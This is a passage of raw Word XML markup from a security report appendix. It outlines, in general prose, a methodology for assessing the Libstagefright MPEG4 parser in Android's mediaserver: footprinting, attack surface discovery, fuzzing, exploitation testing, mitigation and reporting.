          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Appendix C</w:t>
      </w:r>
      <w:r w:rsidR="009D4FEF" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>. Methodology for Application Assessment</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00065360" w:rsidRPr="00802CE3" w:rsidRDefault="00065360" w:rsidP="009D4FEF">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="009D4FEF" w:rsidRPr="00802CE3" w:rsidRDefault="009D4FEF" w:rsidP="00FA0CEB">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">Application </w:t>
      </w:r>
      <w:r w:rsidR="00E433E3" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Footprinting</w:t>
      </w:r>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>– This phase identifies all application</w:t>
      </w:r>
      <w:r w:rsidR="00FA0CEB" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">s and services using the Libstagefright </w:t>
      </w:r>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00FA0CEB" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> In this case Media Server is using the Libstagefright</w:t>
      </w:r>
      <w:r w:rsidR="00065360" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> and also it is a privileged service running in the background.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B87B72" w:rsidRPr="00802CE3" w:rsidRDefault="00B87B72" w:rsidP="009D4FEF">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="009D4FEF" w:rsidRPr="00802CE3" w:rsidRDefault="00065360" w:rsidP="00065360">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Attack Surface Discovery</w:t>
      </w:r>
      <w:r w:rsidR="009D4FEF" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00FA0CEB" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">– </w:t>
      </w:r>
      <w:r w:rsidR="00FA0CEB" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>In this p</w:t>
      </w:r>
      <w:r w:rsidR="00222FD2" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">hase all the attack surfaces are discovered for </w:t>
      </w:r>
      <w:r w:rsidR="00C37495" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>MPEG4</w:t>
      </w:r>
      <w:r w:rsidR="00222FD2" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> Media parsing done by Libstagefright</w:t>
      </w:r>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00222FD2" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> The approach involves attaching the mediaserver process to debugger and monitoring the open function call etc.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B87B72" w:rsidRPr="00802CE3" w:rsidRDefault="00B87B72" w:rsidP="009D4FEF">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00222FD2" w:rsidRPr="00802CE3" w:rsidRDefault="00065360" w:rsidP="00222FD2">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Attack Vector Enumeration</w:t>
      </w:r>
      <w:r w:rsidR="009D4FEF" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="009D4FEF" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>– In thi</w:t>
      </w:r>
      <w:r w:rsidR="00222FD2" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>s phase all the attack vectors are discovered which can trigger the vulnerability.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009D4FEF" w:rsidRPr="00802CE3" w:rsidRDefault="00222FD2" w:rsidP="00222FD2">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>This involves input tracing to the vulnerable function call.</w:t>
      </w:r>
      <w:r w:rsidR="00552F9D" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B87B72" w:rsidRPr="00802CE3" w:rsidRDefault="00B87B72" w:rsidP="009D4FEF">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="0066209C" w:rsidRPr="00802CE3" w:rsidRDefault="00222FD2" w:rsidP="0066209C">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Fuzzing</w:t>
      </w:r>
      <w:r w:rsidR="009D4FEF" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="0066209C" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">– Fuzzing is a technique </w:t>
      </w:r>
      <w:r w:rsidR="00461E7F" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>used to</w:t>
      </w:r>
      <w:r w:rsidR="0066209C" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> test the </w:t>
      </w:r>
      <w:r w:rsidR="00461E7F" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>software by</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0066209C" w:rsidRPr="00802CE3" w:rsidRDefault="00461E7F" w:rsidP="0066209C">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Exposing</w:t>
      </w:r>
      <w:r w:rsidR="0066209C" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> the implementation to unexpected, invalid, or random input with the hope</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009D4FEF" w:rsidRPr="00802CE3" w:rsidRDefault="00461E7F" w:rsidP="0066209C">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>That</w:t>
      </w:r>
      <w:r w:rsidR="0066209C" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> the target will react in an unexpected way, and thereby, to discover new vulnerabilities</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B87B72" w:rsidRPr="00802CE3" w:rsidRDefault="00B87B72" w:rsidP="0066209C">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="009D4FEF" w:rsidRPr="00802CE3" w:rsidRDefault="009D4FEF" w:rsidP="009D4FEF">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">Exploitation and Pen-testing </w:t>
      </w:r>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>– A full blown penetration and exploitation of discovered</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009D4FEF" w:rsidRPr="00802CE3" w:rsidRDefault="00461E7F" w:rsidP="009D4FEF">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Vulnerabilities</w:t>
      </w:r>
      <w:r w:rsidR="009D4FEF" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> is performed to detect the severity and possible impact of existing vulnerabilities.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B87B72" w:rsidRPr="00802CE3" w:rsidRDefault="00B87B72" w:rsidP="009D4FEF">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="009D4FEF" w:rsidRPr="00802CE3" w:rsidRDefault="009D4FEF" w:rsidP="009D4FEF">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">Mitigation Strategies </w:t>
      </w:r>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>– Based on overall findings, a comprehensive plan for mitigation along with</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009D4FEF" w:rsidRPr="00802CE3" w:rsidRDefault="00F05D85" w:rsidP="00F05D85">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Recommendation</w:t>
      </w:r>
      <w:r w:rsidR="009D4FEF" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> on secure coding best practices is provided. These strategies need to be</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009D4FEF" w:rsidRDefault="00747D26" w:rsidP="009D4FEF">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Implemented</w:t>
      </w:r>
      <w:r w:rsidR="009D4FEF" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> for overall security of application.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00802CE3" w:rsidRPr="00802CE3" w:rsidRDefault="00802CE3" w:rsidP="009D4FEF">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00B87B72" w:rsidRPr="00802CE3" w:rsidRDefault="00B87B72" w:rsidP="009D4FEF">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="009D4FEF" w:rsidRPr="00802CE3" w:rsidRDefault="009D4FEF" w:rsidP="009D4FEF">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Reporting </w:t>
      </w:r>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>– All observations, findings, test cases and recommendations are documented in the</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009D4FEF" w:rsidRPr="00802CE3" w:rsidRDefault="00461E7F" w:rsidP="009D4FEF">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
